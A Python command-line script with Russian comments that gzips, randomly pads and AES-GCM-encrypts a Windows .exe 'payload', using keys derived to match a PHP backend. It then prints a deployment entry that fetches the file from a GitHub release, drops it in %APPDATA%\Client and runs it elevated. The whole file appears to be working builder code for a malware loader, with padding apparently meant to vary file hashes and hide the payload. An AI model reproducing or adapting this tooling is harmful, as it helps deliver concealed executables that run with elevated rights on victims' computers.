#!/usr/bin/env python3
"""
Шифрование payload для деплоя.
Деривация ключа идентична PHP KeyDerivation::generateFileKey:
  HKDF(master_key, profile|name, 'payload-decryption-key')
"""

import os
import sys
import gzip
import hmac
import math
import secrets
import hashlib
import argparse
from pathlib import Path
from cryptography.hazmat.primitives.ciphers.aead import AESGCM


def derive_file_key(master_key: bytes, profile: str, name: str) -> bytes:
    """
    Та же деривация что в PHP generateFileKey:
      $salt = hash('sha256', "$profile|$name")
      $prk  = hash_hmac('sha256', masterKey, salt)   <- data=masterKey, key=salt
      $key  = hkdfExpand($prk, 'payload-decryption-key', 32)
    """
    context = f"{profile}|{name}".encode()
    salt = hashlib.sha256(context).digest()

    # PHP: hash_hmac('sha256', data=masterKey, key=salt)
    prk = hmac.new(salt, master_key, hashlib.sha256).digest()

    # HKDF Expand
    info = b'payload-decryption-key'
    hash_len = 32
    n = math.ceil(32 / hash_len)
    okm = b''
    t = b''
    for i in range(1, n + 1):
        t = hmac.new(prk, t + info + bytes([i]), hashlib.sha256).digest()
        okm += t

    return okm[:32]


def encrypt_file(plaintext: bytes, key: bytes) -> bytes:
    """
    Сжимаем → паддинг → AES-256-GCM
    Формат контейнера: [12 bytes nonce][ciphertext+tag]
    Внутри расшифрованного: [4 bytes big-endian length][gzip data][random padding]
    """
    compressed = gzip.compress(plaintext, compresslevel=9)

    padding_size = secrets.randbelow(3584) + 512  # 512-4096
    padding = secrets.token_bytes(padding_size)
    padded = len(compressed).to_bytes(4, 'big') + compressed + padding

    nonce = secrets.token_bytes(12)
    ciphertext = AESGCM(key).encrypt(nonce, padded, None)

    return nonce + ciphertext


def compute_sha256(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def main():
    parser = argparse.ArgumentParser(
        description='Шифрование payload под деплой',
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument('input', help='Входной файл (.exe)')
    parser.add_argument('output', nargs='?', help='Выходной файл (.enc), по умолчанию <input>.enc')
    parser.add_argument('--profile', default='default',
                        help='Профиль из deployments.php (default: default)')
    parser.add_argument('--name', default=None,
                        help='Поле name из deployments.php (default: имя файла без расширения)')
    parser.add_argument('--master-key', default=None,
                        help='Master key hex (или из MASTER_KEY в окружении)')
    parser.add_argument('--get-key', action='store_true',
                        help='Только вывести derived key, не шифровать')
    args = parser.parse_args()

    input_path  = Path(args.input)
    output_path = Path(args.output) if args.output else input_path.with_suffix('.enc')
    name        = args.name or input_path.stem

    # Мастер-ключ: аргумент → env → генерим новый
    master_key_hex = args.master_key or os.getenv('MASTER_KEY')
    if master_key_hex:
        master_key = bytes.fromhex(master_key_hex)
        print(f"[+] Master key: {master_key_hex[:8]}...{master_key_hex[-8:]}")
    else:
        master_key = secrets.token_bytes(32)
        master_key_hex = master_key.hex()
        print(f"[!] Сгенерирован новый master key: {master_key_hex}")
        print(f"[!] Добавь в .env: MASTER_KEY={master_key_hex}")

    # Выводим derived key для этого файла
    derived_key = derive_file_key(master_key, args.profile, name)
    print(f"[+] Profile: {args.profile}  |  Name: {name}")
    print(f"[+] Derived key: {derived_key.hex()}")

    if args.get_key:
        return

    if not input_path.exists():
        print(f"[!] Файл не найден: {input_path}")
        sys.exit(1)

    plaintext = input_path.read_bytes()
    original_size = len(plaintext)
    print(f"[+] Читаем {input_path.name}: {original_size:,} байт")

    container = encrypt_file(plaintext, derived_key)
    sha256    = compute_sha256(container)
    final_size = len(container)

    output_path.write_bytes(container)

    print(f"[+] Зашифровано: {final_size:,} байт → {output_path}")
    print(f"[+] SHA256: {sha256}")
    print(f"\n[✓] Готово! Добавь в deployments.php:")
    print(f"""
    [
        'name'     => '{name}',
        'url'      => 'https://github.com/user/repo/releases/download/v1/{output_path.name}',
        'sha256'   => '{sha256}',
        'target'   => '%APPDATA%\\\\Client\\\\{input_path.name}',
        'run'      => true,
        'elevated' => true
    ]
    """)
    print(f"[i] profile в деплое должен совпадать с --profile (сейчас: '{args.profile}')")


if __name__ == '__main__':
    main()
